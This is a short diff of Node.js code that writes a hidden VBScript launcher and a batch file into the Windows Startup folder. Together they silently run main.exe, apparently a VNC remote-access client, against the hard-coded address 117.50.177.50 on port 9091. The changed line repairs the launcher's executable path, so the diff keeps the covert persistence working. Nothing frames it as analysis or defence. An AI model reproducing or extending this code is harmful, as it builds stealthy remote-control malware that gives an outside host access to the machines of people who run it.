@@ -15,7 +15,7 @@ const vbPath = path.join(vncDirPath, 'run.vbs')
 const batPath = path.join(vncDirPath, 'run.bat')
 const mainPath = path.join(vncDirPath, 'main.exe')
 const runPath = path.join(os.homedir(), 'AppData','Roaming','Microsoft','Windows','Start Menu','Programs','Startup', 'run.bat')
-const vbContent = `Set ws=WScript.CreateObject("Wscript.Shell")\nws.Run "${exePath} 117.50.177.50 9091",vbhide`
+const vbContent = `Set ws=WScript.CreateObject("Wscript.Shell")\nws.Run "${mainPath} 117.50.177.50 9091",vbhide`
 const batContent = `@echo off\nstart /MIN "wumin" "C:\\Windows\\System32\\cmd.exe"\n${vbPath}\ntaskkill /f /im cmd.exe\nexit`
 
 fs.writeFileSync(vbPath, vbContent)
